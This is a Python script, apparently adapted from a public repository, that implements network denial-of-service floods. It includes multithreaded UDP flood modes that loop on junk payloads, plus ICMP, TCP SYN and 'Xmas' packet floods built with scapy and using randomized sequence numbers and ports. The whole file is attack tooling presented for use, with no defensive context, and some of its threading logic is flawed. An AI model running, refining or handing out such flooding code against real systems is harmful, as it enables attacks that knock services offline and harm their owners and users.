#/usr/bin/python3
#Source - https://github.com/EmreOvunc/Icmp-Syn-Flood
from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP

import sys
import socket
import threading
import time as clock

# host = str(sys.argv[1])
# port = int(sys.argv[2])
# #time = int(sys.argv[4])
# method = str(sys.argv[3])

loops = 10000

def send_packet(amplifier, host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(host), int(port)))
        while True: s.send(b"\x99" * amplifier)
    except: return s.close()

def timer(timeout):
   while True:
       if clock.time() > timeout: exit()
       if clock.time() < timeout: clock.sleep(0.1)

def attack_UDP(method, host, port, time):
    timeout = clock.time() + time
    timer(timeout)
    if method == "UDP-Flood":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375, host, port), daemon=True).start()
    if method == "UDP-Power":
        for sequence in range(loops):
            threading.Thread(target=send_packet(750, host, port), daemon=True).start()
    if method == "UDP-Mix":
        for sequence in range(loops):
            threading.Thread(target=send_packet(375, host, port), daemon=True).start()
            threading.Thread(target=send_packet(750, host, port), daemon=True).start()
def icmpflood(target,cycle):
    for x in range (0,int(cycle)):
        send(IP(dst=target)/ICMP())


def synflood(target,targetPort,cycle):
    for x in range(0, int(cycle)):
        send(IP(dst=target)/TCP(dport=targetPort,
                                flags="S",
                                seq=RandShort(),
                                ack=RandShort(),
                                sport=RandShort()))

def xmasflood(target,targetPort,cycle):
    for x in range(0, int(cycle)):
        send(IP(dst=target)/TCP(dport=targetPort,
                                flags="FSRPAUEC",
                                seq=RandShort(),
                                ack=RandShort(),
                                sport=RandShort()))


